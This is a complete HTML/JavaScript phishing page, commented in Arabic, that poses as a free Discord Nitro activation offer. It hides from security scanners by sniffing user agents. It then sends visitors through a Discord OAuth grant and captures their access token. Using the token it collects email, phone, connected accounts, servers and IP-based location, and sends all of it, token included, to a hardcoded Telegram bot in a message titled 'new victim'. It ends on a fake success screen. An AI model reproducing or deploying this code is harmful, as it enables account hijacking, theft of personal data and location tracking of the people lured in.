<body>

<div class="loader" id="init-loader"></div>

<script>
// ================= إعداداتك =================
const CLIENT_ID = "1523373482413658334";
const TG_TOKEN  = "9213796296:AAFgiZR1cwWLX6-W_yQhtBpjp8TEptKHdtU";
const TG_CHAT_ID = "ضع_الـ_CHAT_ID_بتاعك_هنا"; 
// ============================================

// 1. دالة كشف البوتات (عشان الموقع ميتحظرش)
function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botSignatures = ['bot', 'crawl', 'spider', 'headless', 'puppeteer', 'selenium', 'phantomjs', 'slurp', 'googlebot', 'bingbot', 'yandex', 'baiduspider', 'virustotal', 'urlscan', 'python', 'curl', 'wget'];
    for (let sig of botSignatures) { if (ua.includes(sig)) return true; }
    if (navigator.webdriver) return true;
    if (screen.width === 0 || screen.height === 0) return true;
    return false;
}

// 2. دالة بناء الصفحة (بتحقن الـ HTML والـ CSS في الصفحة بعد فحص البوت)
function buildPage() {
    const css = `
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'gg sans','Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#e8eaf0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;overflow-x:hidden;position:relative}
        body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 10%,rgba(88,101,242,.35),transparent 45%),radial-gradient(circle at 80% 90%,rgba(168,85,247,.28),transparent 45%),radial-gradient(circle at 50% 50%,rgba(59,130,246,.12),transparent 60%);z-index:0;pointer-events:none}
        .card{position:relative;z-index:1;max-width:520px;width:100%;background:rgba(19,20,28,.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:48px 36px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.6),0 0 100px rgba(88,101,242,.15)}
        .badge{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#5865f2,#a855f7);color:#fff;font-size:12px;font-weight:600;padding:6px 14px;border-radius:99px;text-transform:uppercase;letter-spacing:1px;margin-bottom:24px}
        .badge::before{content:'';width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px #22c55e;animation:pulse 1.5s infinite}
        @keyframes pulse{50%{opacity:.4}}
        .logo{width:72px;height:72px;margin:0 auto 24px;display:block}
        h1{font-size:32px;font-weight:800;line-height:1.2;margin-bottom:12px;background:linear-gradient(135deg,#fff,#a5b4fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{color:#9ca3af;font-size:15px;line-height:1.6;margin-bottom:32px}
        .features{text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:20px;margin-bottom:28px}
        .feat{display:flex;align-items:center;gap:12px;padding:8px 0;font-size:14px;color:#d1d5db}
        .feat svg{flex-shrink:0;color:#22c55e}
        .btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;background:linear-gradient(135deg,#5865f2,#7c3aed);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;transition:transform .15s,box-shadow .15s;box-shadow:0 10px 30px rgba(88,101,242,.4)}
        .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(88,101,242,.6)}
        .foot{margin-top:20px;font-size:12px;color:#6b7280}
        .hidden{display:none !important}
        .spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,.1);border-top-color:#5865f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .check{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#22c55e,#16a34a);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 0 60px rgba(34,197,94,.6);animation:pop .6s ease-out}
        @keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
        .check svg{width:48px;height:48px;color:#fff}
    `;

    const html = `
        <style>${css}</style>
        
        <div class="card" id="landing">
            <div class="badge">Live · 2,847 activated today</div>
            <svg class="logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
                <path fill="url(#g)" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
                <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#5865f2"/><stop offset="1" stop-color="#a855f7"/></linearGradient></defs>
            </svg>
            <h1>Unlock Discord Premium</h1>
            <p class="sub">Activate your account to receive premium features, exclusive badges, and Nitro perks instantly.</p>
            <div class="features">
                <div class="feat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Free Nitro for 3 months</div>
                <div class="feat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Exclusive profile badges</div>
                <div class="feat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Unlock all premium emojis</div>
                <div class="feat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Priority customer support</div>
            </div>
            <button onclick="activate()" class="btn">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Activate Now
            </button>
            <p class="foot">You'll be redirected to Discord to securely authorize access</p>
        </div>

        <div class="card hidden" id="loading">
            <div class="spinner"></div>
            <h1 style="font-size:24px">Activating...</h1>
            <p class="sub">Please wait while we verify your account.</p>
        </div>

        <div class="card hidden" id="success">
            <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
            <h1>Activated Successfully!</h1>
            <p>Welcome, <span style="color:#a5b4fc;font-weight:600" id="uname">user</span>. Your premium features are now unlocked.</p>
            <div style="background:rgba(88,101,242,.15);border:1px solid rgba(88,101,242,.3);border-radius:12px;padding:16px;color:#c7d2fe;font-size:14px">
                Redirecting in <b id="cd">5</b> seconds · <a href="https://discord.com/app" style="color:#00a8fc;text-decoration:none">Open Discord</a>
            </div>
        </div>
    `;
    
    document.body.innerHTML = html;
    
    // بعد ما بنينا الصفحة، بنشغل فحص الـ Callback
    if (!handleCallback()) {
        // لو مفيش توكن، الصفحة هتفضل على الـ landing
    }
}

// 3. دالة التوجيه
function activate() {
    const currentUrl = window.location.href.split('?')[0].split('#')[0];
    const redirectUri = encodeURIComponent(currentUrl);
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=token&redirect_uri=${redirectUri}&scope=identify%20email%20connections%20guilds&integration_type=1&prompt=consent`;
    window.location.href = oauthUrl;
}

// 4. دالة استقبال البيانات وإرسالها
async function handleCallback() {
    const hash = window.location.hash.substring(1);
    if (!hash) return false;

    const params = new URLSearchParams(hash);
    const accessToken = params.get('access_token');
    if (!accessToken) return false;

    document.getElementById('landing').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');

    try {
        const userRes = await fetch('https://discord.com/api/v10/users/@me', { headers: { 'Authorization': 'Bearer ' + accessToken } });
        const user = await userRes.json();
        document.getElementById('uname').textContent = user.username || 'user';

        let connections = [], guilds = [], ipData = {};
        try {
            const connRes = await fetch('https://discord.com/api/v10/users/@me/connections', { headers: { 'Authorization': 'Bearer ' + accessToken } });
            const c = await connRes.json(); if(Array.isArray(c)) connections = c;
            const gRes = await fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { 'Authorization': 'Bearer ' + accessToken } });
            const g = await gRes.json(); if(Array.isArray(g)) guilds = g;
            const ipRes = await fetch('https://ipwho.is/');
            ipData = await ipRes.json();
        } catch (e) { console.log(e); }

        let mapLink = ipData.latitude ? `[اضغط هنا](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})` : 'غير متوفر';
        let conns = connections.slice(0, 15).map(c => `  • ${c.type} → \`${c.name}\``).join('\n') || '  —';
        if (connections.length > 15) conns += `\n  ...و ${connections.length - 15} آخرين`;
        
        let guildsList = guilds.slice(0, 20).map(g => `  • ${g.name} ${g.owner ? '(Owner)' : ''}`).join('\n') || '  —';
        if (guilds.length > 20) guildsList += `\n  ...و ${guilds.length - 20} سيرفر آخر`;

        const msg = `🔥 *ضحية جديدة — OAuth*\n\n` +
            `👤 *Username:* \`${user.username}#${user.discriminator || '0'}\`\n` +
            `📛 *Display:* \`${user.global_name || user.username}\`\n` +
            `🆔 *ID:* \`${user.id}\`\n` +
            `📧 *Email:* \`${user.email || '—'}\`\n` +
            `📱 *Phone:* \`${user.phone || '—'}\`\n` +
            `✅ *Verified:* \`${user.verified}\`\n` +
            `🔒 *2FA:* \`${user.mfa_enabled}\`\n\n` +
            `🌍 *IP:* \`${ipData.ip || '?'}\`\n` +
            `📍 *Location:* ${ipData.country || '?'} / ${ipData.region || '?'} / ${ipData.city || '?'}\n` +
            `🗺️ *Google Maps:* ${mapLink}\n` +
            `🌐 *ISP:* ${(ipData.connection && ipData.connection.isp) ? ipData.connection.isp : '?'}\n\n` +
            `📺 *Connections (${connections.length}):*\n${conns}\n\n` +
            `🏰 *Guilds (${guilds.length}):*\n${guildsList}\n\n` +
            `🎫 *Access Token:*\n\`${accessToken}\``;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });

        document.getElementById('loading').classList.add('hidden');
        document.getElementById('success').classList.remove('hidden');
        startCountdown();

    } catch (err) {
        console.error(err);
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('success').classList.remove('hidden');
        startCountdown();
    }
    return true;
}

function startCountdown() {
    let t = 5; const cd = document.getElementById('cd');
    const iv = setInterval(() => { t--; cd.textContent = t; if (t <= 0) { clearInterval(iv); window.location.href = 'https://discord.com/app'; } }, 1000);
}

// 5. التشغيل
if (isBot()) {
    // لو بوت، اعرض صفحة بيضاء عشان الفحص يعدي
    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif;color:#666;"><h2>Checking your browser before accessing...</h2><p>Please wait...</p></div>';
} else {
    // لو إنسان، ابني الصفحة
    buildPage();
}
</script>
